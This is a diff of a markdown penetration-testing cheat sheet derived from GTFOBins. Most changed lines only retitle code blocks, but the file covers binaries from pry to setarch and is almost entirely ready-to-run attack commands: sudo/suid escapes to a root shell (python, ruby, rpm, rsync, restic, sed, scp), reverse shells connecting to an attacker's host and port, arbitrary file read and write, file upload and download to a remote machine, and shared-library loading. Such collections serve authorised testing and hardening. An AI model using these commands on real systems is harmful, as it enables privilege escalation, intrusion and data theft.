 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pry inherit (inherits from irb) (sudo / unprivileged)"
 pry
 ```
 <!-- cheat
@@ -7461,7 +7587,7 @@ pry
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins psftp shell (sudo / suid / unprivileged)"
 psftp
 !/bin/sh
 ```
@@ -7476,7 +7602,7 @@ A valid PostgreSQL server must be available to connect to.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins psql shell (sudo / suid / unprivileged)"
 psql
 \! /bin/sh
 ```
@@ -7487,7 +7613,7 @@ psql
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins psql inherit (inherits from less) (sudo / suid / unprivileged)"
 psql
 \?
 ```
@@ -7502,7 +7628,7 @@ While the program is capable of reading the file, it outputs a "permuted index" 
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ptx file-read (sudo / suid / unprivileged)"
 ptx -w 999 $file_in
 ```
 <!-- cheat
@@ -7515,7 +7641,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins puppet shell (sudo / unprivileged)"
 puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
 ```
 <!-- cheat
@@ -7525,7 +7651,7 @@ puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
 
 The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins puppet file-read (sudo / unprivileged)"
 puppet filebucket -l diff /dev/null $file_in
 ```
 <!-- cheat
@@ -7536,7 +7662,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins puppet file-write (sudo / unprivileged)"
 puppet apply -e 'file { "$file_out": content => "$data" }'
 ```
 <!-- cheat
@@ -7550,7 +7676,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pwsh shell (sudo / unprivileged)"
 pwsh
 ```
 <!-- cheat
@@ -7560,7 +7686,7 @@ pwsh
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pwsh file-write (sudo / unprivileged)"
 pwsh -c '"$data" | Out-File $file_out'
 ```
 <!-- cheat
@@ -7574,7 +7700,7 @@ var file_out
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pygmentize file-read (sudo / unprivileged)"
 pygmentize -l text $file_in
 ```
 <!-- cheat
@@ -7587,7 +7713,7 @@ var file_in
 
 Content is leaked as error messages.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pyright file-read #1 (sudo / unprivileged)"
 pyright $file_in
 ```
 <!-- cheat
@@ -7598,7 +7724,7 @@ var file_in
 
 Content is leaked as error messages in JSON format.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pyright file-read #2 (sudo / unprivileged)"
 pyright --outputjson $file_in
 ```
 <!-- cheat
@@ -7609,7 +7735,7 @@ var file_in
 
 Recursively walks directories, parsing all Python files and leaking some contents through diagnostics.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins pyright file-read #3 (sudo / unprivileged)"
 pyright -w $dir_in/
 ```
 <!-- cheat
@@ -7624,7 +7750,7 @@ The payloads are compatible with both Python version 2 and 3.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins python shell (capabilities / sudo / suid / unprivileged)"
 python -c 'import os; os.execl("/bin/sh", "sh")'
 ```
 <!-- cheat
@@ -7632,7 +7758,9 @@ python -c 'import os; os.execl("/bin/sh", "sh")'
 
 #### python shell - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins python shell - capabilities override (capabilities variant)"
 python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
 <!-- cheat
@@ -7640,7 +7768,9 @@ python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 
 #### python shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins python shell - suid override (suid variant)"
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 <!-- cheat
@@ -7650,7 +7780,7 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins python reverse-shell (sudo / suid / unprivileged)"
 python -c 'import sys,socket,os,pty;s=socket.socket()
 s.connect(("$lhost",$lport))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
@@ -7665,7 +7795,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins python file-read (sudo / suid / unprivileged)"
 python -c 'print(open("$file_in").read())'
 ```
 <!-- cheat
@@ -7676,7 +7806,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins python file-write (sudo / suid / unprivileged)"
 python -c 'open("$file_out","w+").write("$data")'
 ```
 <!-- cheat
@@ -7688,7 +7818,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins python download (sudo / suid / unprivileged)"
 python -c 'import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
@@ -7705,7 +7835,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins python upload #1 (sudo / suid / unprivileged)"
 python -c 'import sys
 if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
 else: import urllib as u, urllib2 as r
@@ -7721,7 +7851,7 @@ var file_in
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins python upload #2 (sudo / suid / unprivileged)"
 python -c 'import sys
 if sys.version_info.major == 3: import http.server as s, socketserver as ss
 else: import SimpleHTTPServer as s, SocketServer as ss
@@ -7735,7 +7865,7 @@ import lports
 
 Load an attacker-supplied shared library.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins python library-load (capabilities / sudo / suid / unprivileged)"
 python -c 'from ctypes import cdll; cdll.LoadLibrary("$lib")'
 ```
 <!-- cheat
@@ -7748,7 +7878,7 @@ var lib
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins qpdf file-read (sudo / suid / unprivileged)"
 qpdf --empty --add-attachment $file_in --key=x -- $file_out
 qpdf --show-attachment=x $file_out
 ```
@@ -7763,7 +7893,7 @@ var file_out
 
 The file is actually parsed and the first wrong line is returned in an error message.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rake file-read (sudo / unprivileged)"
 rake -f $file_in
 ```
 <!-- cheat
@@ -7774,7 +7904,7 @@ var file_in
 
 This allows to run Ruby code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rake inherit (inherits from ruby) (sudo / unprivileged)"
 rake -p '...'
 ```
 <!-- cheat
@@ -7786,7 +7916,7 @@ rake -p '...'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ranger shell (sudo / unprivileged)"
 ranger
 S
 ```
@@ -7799,7 +7929,7 @@ S
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rc shell (sudo / suid / unprivileged)"
 rc
 ```
 <!-- cheat
@@ -7811,7 +7941,7 @@ rc
 
 Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins readelf file-read (sudo / suid / unprivileged)"
 readelf -a @$file_in
 ```
 <!-- cheat
@@ -7828,7 +7958,7 @@ Alias of [ed](#ed). All techniques from `ed` apply.
 
 The file is actually parsed as a Markdown file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins redcarpet file-read (sudo / unprivileged)"
 redcarpet $file_in
 ```
 <!-- cheat
@@ -7841,7 +7971,7 @@ var file_in
 
 Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.  Keep in mind that it's actually the server to perform the file write.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins redis file-write (sudo / suid / unprivileged)"
 redis-cli -h 127.0.0.1
 config set dir $dir_out/
 config set dbfilename output-file
@@ -7859,7 +7989,7 @@ var dir_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins restic shell #1 (sudo / suid / unprivileged)"
 RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
 ```
 <!-- cheat
@@ -7867,7 +7997,9 @@ RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
 
 #### restic shell #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins restic shell #1 - suid override (suid variant)"
 RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
 ```
 <!-- cheat
@@ -7877,7 +8009,7 @@ RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins restic shell #2 (sudo / suid / unprivileged)"
 restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
 ```
 <!-- cheat
@@ -7885,7 +8017,9 @@ restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
 
 #### restic shell #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins restic shell #2 - suid override (suid variant)"
 restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
 ```
 <!-- cheat
@@ -7895,7 +8029,7 @@ restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins restic command #1 (sudo / suid / unprivileged)"
 RESTIC_PASSWORD_COMMAND='$cmd_file' restic backup
 ```
 <!-- cheat
@@ -7906,7 +8040,7 @@ var cmd_file
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins restic command #2 (sudo / suid / unprivileged)"
 restic --password-command='$cmd_file' backup
 ```
 <!-- cheat
@@ -7917,7 +8051,7 @@ var cmd_file
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins restic upload (sudo / suid / unprivileged)"
 restic backup -r rest:$scheme://$lhost:$lport/x $file_in
 ```
 <!-- cheat
@@ -7933,7 +8067,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rev file-read (sudo / suid / unprivileged)"
 rev $file_in | rev
 ```
 <!-- cheat
@@ -7946,7 +8080,7 @@ var file_in
 
 The file is corrupted by leading and trailing spurious data.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rlogin upload (sudo / suid / unprivileged)"
 rlogin -l $data -p $lport $lhost
 ```
 <!-- cheat
@@ -7961,7 +8095,7 @@ var data
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rlwrap shell (sudo / suid / unprivileged)"
 rlwrap /bin/sh
 ```
 <!-- cheat
@@ -7969,7 +8103,9 @@ rlwrap /bin/sh
 
 #### rlwrap shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins rlwrap shell - suid override (suid variant)"
 rlwrap /bin/sh -p
 ```
 <!-- cheat
@@ -7979,7 +8115,7 @@ rlwrap /bin/sh -p
 
 This adds timestamps to the output file. This relies on the external `echo` command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rlwrap file-write (sudo / suid / unprivileged)"
 rlwrap -l $file_out echo $data
 ```
 <!-- cheat
@@ -7993,7 +8129,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpm shell #1 (sudo / suid / unprivileged)"
 rpm --eval '%(/bin/sh 1>&2)'
 ```
 <!-- cheat
@@ -8003,7 +8139,7 @@ rpm --eval '%(/bin/sh 1>&2)'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpm shell #2 (sudo / suid / unprivileged)"
 rpm --pipe '/bin/sh 0<&1'
 ```
 <!-- cheat
@@ -8013,7 +8149,7 @@ rpm --pipe '/bin/sh 0<&1'
 
 Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```
 
-```sh title:"sudo"
+```sh title:"GTFOBins rpm command (sudo)"
 rpm -ivh x-1.0-1.noarch.rpm
 ```
 <!-- cheat
@@ -8023,7 +8159,7 @@ rpm -ivh x-1.0-1.noarch.rpm
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpm inherit (inherits from lua) (sudo / suid / unprivileged)"
 rpm --eval '%{lua:...}'
 ```
 <!-- cheat
@@ -8035,7 +8171,7 @@ rpm --eval '%{lua:...}'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpmdb shell (sudo / suid / unprivileged)"
 rpmdb --eval '%(/bin/sh 1>&2)'
 ```
 <!-- cheat
@@ -8045,7 +8181,7 @@ rpmdb --eval '%(/bin/sh 1>&2)'
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpmdb inherit (inherits from lua) (sudo / suid / unprivileged)"
 rpmdb --eval '%{lua:...}'
 ```
 <!-- cheat
@@ -8057,7 +8193,7 @@ rpmdb --eval '%{lua:...}'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpmquery shell (sudo / suid / unprivileged)"
 rpmquery --eval '%(/bin/sh 1>&2)'
 ```
 <!-- cheat
@@ -8067,7 +8203,7 @@ rpmquery --eval '%(/bin/sh 1>&2)'
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpmquery inherit (inherits from lua) (sudo / suid / unprivileged)"
 rpmquery --eval '%{lua:...}'
 ```
 <!-- cheat
@@ -8079,7 +8215,7 @@ rpmquery --eval '%{lua:...}'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpmverify shell (sudo / suid / unprivileged)"
 rpmverify --eval '%(/bin/sh 1>&2)'
 ```
 <!-- cheat
@@ -8089,7 +8225,7 @@ rpmverify --eval '%(/bin/sh 1>&2)'
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rpmverify inherit (inherits from lua) (sudo / suid / unprivileged)"
 rpmverify --eval '%{lua:...}'
 ```
 <!-- cheat
@@ -8101,7 +8237,7 @@ rpmverify --eval '%{lua:...}'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rsync shell (sudo / suid / unprivileged)"
 rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
 ```
 <!-- cheat
@@ -8109,7 +8245,9 @@ rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
 
 #### rsync shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins rsync shell - suid override (suid variant)"
 rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
 ```
 <!-- cheat
@@ -8121,7 +8259,7 @@ rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
 
 In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:  ``` ssh somerandomstring@victim.com ```
 
-```sh title:"sudo"
+```sh title:"GTFOBins rsyslogd command (sudo)"
 cat >$tmp_file <<EOF
 module(load="imuxsock")
 :msg, contains, "somerandomstring" ^$cmd_file
@@ -8140,7 +8278,7 @@ var tmp_file
 
 After the shell, exit with `Ctrl-Q`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins rtorrent shell (sudo / suid / unprivileged)"
 echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
 rtorrent
 ```
@@ -8149,7 +8287,9 @@ rtorrent
 
 #### rtorrent shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins rtorrent shell - suid override (suid variant)"
 echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
 rtorrent
 ```
@@ -8162,7 +8302,7 @@ rtorrent
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / unprivileged"
+```sh title:"GTFOBins ruby shell (capabilities / sudo / unprivileged)"
 ruby -e 'exec "/bin/sh"'
 ```
 <!-- cheat
@@ -8170,7 +8310,9 @@ ruby -e 'exec "/bin/sh"'
 
 #### ruby shell - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins ruby shell - capabilities override (capabilities variant)"
 ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
 ```
 <!-- cheat
@@ -8180,7 +8322,7 @@ ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ruby reverse-shell (sudo / unprivileged)"
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$lhost",$lport);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 <!-- cheat
@@ -8192,7 +8334,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ruby file-read (sudo / unprivileged)"
 ruby -e 'puts File.read("$file_in")'
 ```
 <!-- cheat
@@ -8203,7 +8345,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ruby file-write (sudo / unprivileged)"
 ruby -e 'File.open("$file_out", "w+") { |f| f.write("$data") }'
 ```
 <!-- cheat
@@ -8215,7 +8357,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ruby download (sudo / unprivileged)"
 ruby -e 'require "open-uri"; download = URI.open("$scheme://$lhost$file_in"); IO.copy_stream(download, "$file_out")'
 ```
 <!-- cheat
@@ -8229,7 +8371,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ruby upload (sudo / unprivileged)"
 ruby -run -e httpd . -p 80
 ```
 <!-- cheat
@@ -8239,7 +8381,7 @@ ruby -run -e httpd . -p 80
 
 Load an attacker-supplied shared library.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ruby library-load (sudo / unprivileged)"
 ruby -e 'require "fiddle"; Fiddle.dlopen("$lib")'
 ```
 <!-- cheat
@@ -8252,7 +8394,7 @@ var lib
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins run-mailcap inherit #1 (inherits from less) (sudo / unprivileged)"
 run-mailcap --action=view text/plain:/etc/hosts
 ```
 <!-- cheat
@@ -8262,7 +8404,7 @@ run-mailcap --action=view text/plain:/etc/hosts
 
 The file must exist and be not empty.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins run-mailcap inherit #2 (inherits from vi) (sudo / unprivileged)"
 run-mailcap --action=edit text/plain:$file_out
 ```
 <!-- cheat
@@ -8275,7 +8417,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins run-parts shell #1 (sudo / suid / unprivileged)"
 run-parts --new-session --regex '^sh$' /bin
 ```
 <!-- cheat
@@ -8283,7 +8425,9 @@ run-parts --new-session --regex '^sh$' /bin
 
 #### run-parts shell #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins run-parts shell #1 - suid override (suid variant)"
 run-parts --new-session --regex '^sh$' /bin --arg='-p'
 ```
 <!-- cheat
@@ -8293,7 +8437,7 @@ run-parts --new-session --regex '^sh$' /bin --arg='-p'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins run-parts shell #2 (sudo / suid / unprivileged)"
 cp /bin/sh $tmp_dir/
 run-parts $tmp_dir/
 ```
@@ -8303,7 +8447,9 @@ var tmp_dir
 
 #### run-parts shell #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins run-parts shell #2 - suid override (suid variant)"
 cp /bin/sh $tmp_dir/
 run-parts $tmp_dir/ --arg='-p'
 ```
@@ -8317,7 +8463,7 @@ var tmp_dir
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins runscript shell (sudo / suid / unprivileged)"
 echo '! exec /bin/sh' >$tmp_file
 runscript $tmp_file
 ```
@@ -8331,7 +8477,7 @@ var tmp_file
 
 The compiler leaks some file lines in the compiler error.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustc file-read (sudo / unprivileged)"
 rustc $file_in
 ```
 <!-- cheat
@@ -8342,7 +8488,7 @@ var file_in
 
 The comment appears in the compiled program.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustc file-write (sudo / unprivileged)"
 echo 'fn main() { println!("$data"); }' >$tmp_file
 rustc $tmp_file -o $file_out
 ```
@@ -8356,7 +8502,7 @@ var tmp_file
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustc inherit (inherits from less) (sudo / unprivileged)"
 rustc --explain E0001
 ```
 <!-- cheat
@@ -8368,7 +8514,7 @@ rustc --explain E0001
 
 Partial content is displayed as error messages.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustdoc file-read (sudo / unprivileged)"
 rustdoc $file_in
 ```
 <!-- cheat
@@ -8379,7 +8525,7 @@ var file_in
 
 This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-file.html`, amidst other content.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustdoc file-write (sudo / unprivileged)"
 echo '//! $data' >$tmp_file
 rustdoc $tmp_file -o $dir_out/
 ```
@@ -8395,7 +8541,7 @@ var tmp_file
 
 Partial content is displayed as error messages.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustfmt file-read (sudo / unprivileged)"
 rustfmt $file_in
 ```
 <!-- cheat
@@ -8408,7 +8554,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustup shell (sudo / unprivileged)"
 mkdir $tmp_dir/bin/
 mkdir $tmp_dir/lib/
 cp /bin/sh $tmp_dir/bin/rustc
@@ -8423,7 +8569,7 @@ var tmp_dir
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins rustup command (sudo / unprivileged)"
 mkdir $tmp_dir/bin/
 mkdir $tmp_dir/lib/
 echo '$cmd_file' >$tmp_dir/bin/rustc
@@ -8450,7 +8596,7 @@ Alias of [vim](#vim). All techniques from `vim` apply.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sash shell (sudo / suid / unprivileged)"
 sash
 ```
 <!-- cheat
@@ -8462,7 +8608,7 @@ sash
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins scanmem shell (sudo / suid / unprivileged)"
 scanmem
 shell /bin/sh
 ```
@@ -8475,7 +8621,7 @@ shell /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins scp shell #1 (sudo / suid / unprivileged)"
 echo 'exec /bin/sh 0<&2 1>&2' >$tmp_file
 chmod +x $tmp_file
 scp -S $tmp_file x x:
@@ -8488,7 +8634,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins scp shell #2 (sudo / suid / unprivileged)"
 scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
 ```
 <!-- cheat
@@ -8498,7 +8644,7 @@ scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins scp download (sudo / suid / unprivileged)"
 scp user@$lhost:$file_in $file_out
 ```
 <!-- cheat
@@ -8511,7 +8657,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins scp upload (sudo / suid / unprivileged)"
 scp $file_in user@$lhost:$file_out
 ```
 <!-- cheat
@@ -8526,7 +8672,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins screen shell (sudo / unprivileged)"
 screen
 ```
 <!-- cheat
@@ -8536,7 +8682,7 @@ screen
 
 Data is appended to the file and `\n` is converted to `\r\n`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins screen file-write #1 (sudo / unprivileged)"
 screen -L -Logfile $file_out echo $data
 ```
 <!-- cheat
@@ -8548,7 +8694,7 @@ var file_out
 
 Data is appended to the file and `\n` is converted to `\r\n`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins screen file-write #2 (sudo / unprivileged)"
 screen -L $file_out echo $data
 ```
 <!-- cheat
@@ -8562,7 +8708,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins script shell (sudo / suid / unprivileged)"
 script -q /dev/null
 ```
 <!-- cheat
@@ -8572,7 +8718,7 @@ script -q /dev/null
 
 The content appears among the log prints.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins script file-write (sudo / suid / unprivileged)"
 script -q -c '# $data' $file_out
 ```
 <!-- cheat
@@ -8588,7 +8734,7 @@ This requires a running X server.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins scrot shell (sudo / suid / unprivileged)"
 scrot -e /bin/sh
 ```
 <!-- cheat
@@ -8600,7 +8746,7 @@ scrot -e /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sed shell #1 (sudo / suid / unprivileged)"
 sed -n '1e exec /bin/sh 1>&0' /etc/hosts
 ```
 <!-- cheat
@@ -8610,7 +8756,7 @@ sed -n '1e exec /bin/sh 1>&0' /etc/hosts
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sed shell #2 (sudo / suid / unprivileged)"
 sed e
 ```
 <!-- cheat
@@ -8620,7 +8766,7 @@ sed e
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sed file-read (sudo / suid / unprivileged)"
 sed '' $file_in
 ```
 <!-- cheat
@@ -8631,7 +8777,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sed file-write (sudo / suid / unprivileged)"
 sed -n '1s/.*/$data/w $file_out' /etc/hosts
 ```
 <!-- cheat
@@ -8645,7 +8791,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins service shell (sudo / unprivileged)"
 service ../../bin/sh
 ```
 <!-- cheat
@@ -8657,7 +8803,7 @@ service ../../bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins setarch shell (sudo / suid / unprivileged)"
